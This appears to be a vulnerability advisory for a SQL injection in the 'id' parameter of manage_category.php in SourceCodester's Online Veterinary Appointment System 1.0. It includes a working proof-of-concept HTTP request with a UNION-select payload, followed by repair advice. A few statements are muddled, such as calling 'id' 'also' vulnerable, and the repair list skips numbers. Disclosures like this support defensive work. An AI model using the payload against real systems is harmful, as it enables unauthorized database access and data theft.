# Submit #421548: SourceCodester Online Veterinary Appointment System v1.0 SQL Injection[info](?kb.submission)

| Title | SourceCodester Online Veterinary Appointment System v1.0 SQL Injection |
| --- | --- |
| Description | # sourcecodester.com"Online Veterinary Appointment System" in PHP 1.0 "manage\_category.php" SQL injection # BUG\_AUTHORÔºöyangfan A critical vulnerability has been discovered in sourcecodester Online Veterinary Appointment System 1.0. This issue exists in the /manage\_category.php file. The vulnerability involves the "id" argument, which can be manipulated to perform SQL injection. The attack can be carried out remotely. The exploit has been made public and is available for use. The original advisory mentioned only the "id" parameter, but it is likely that the "id" parameter is also vulnerable. # NAME OF AFFECTED PRODUCT(S) - Online Veterinary Appointment System using PHP/OOP Free Source Code ## Vendor Homepage https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html # AFFECTED AND/OR FIXED VERSION(S) ## submitter - yangfan ## Vulnerable File - /ovas/admin/categories/manage\_category.php ## VERSION(S) - V1.0 ## Software Link https://www.sourcecodester.com/download-code?nid=15119&title=Online+Veterinary+Appointment+System+using+PHP%2FOOP+Free+Source+Code # PROBLEM TYPE ## Vulnerability Type - SQL injection ## Root Cause - A SQL injection vulnerability was found in the 'manage\_category.php' file of the 'Online Veterinary Appointment System' project. The reason for this issue is that attackers inject malicious code from the parameter "id" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations. ## Impact - Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity. # DESCRIPTION - During the security review of the PHP "Online Veterinary Appointment System", "yangfan" discovered a critical SQL injection vulnerability in the "manage\_category.php" file. This vulnerability stems from insufficient user input validation of the "id" parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity. # login or authorization is required to exploit this vulnerability # Vulnerability details and POC ```sql GET /ovas/admin/categories/manage\_category.php?id=-5%27%20union%20select%201,database(),3,4,5--+ HTTP/1.1 Host: x.x.x.x User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Cookie: PHPSESSID=1ko4ejqndpgccnc19ds89thmad Connection: close ``` ## Vulnerability type: - UNION query ## Vulnerability location: - 'id' parameter ## Payload: <hr> Payload: /ovas/admin/categories/manage\_category.php?id=-5' union select 1,database(),3,4,5--+ ![image](https://github.com/user-attachments/assets/ab236252-cedb-4291-958c-24fa214eeb2b) <hr> ![image](https://github.com/user-attachments/assets/69ad51db-1cd2-43e1-bdb3-774a8f9cf2a5) # Suggested repair 1. Use prepared statements and parameter binding: Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code. 3. Input validation and filtering: Strictly validate and filter user input data to ensure it conforms to the expected format. 5. Minimize database user permissions: Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations. 7. Regular security audits: Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities. |
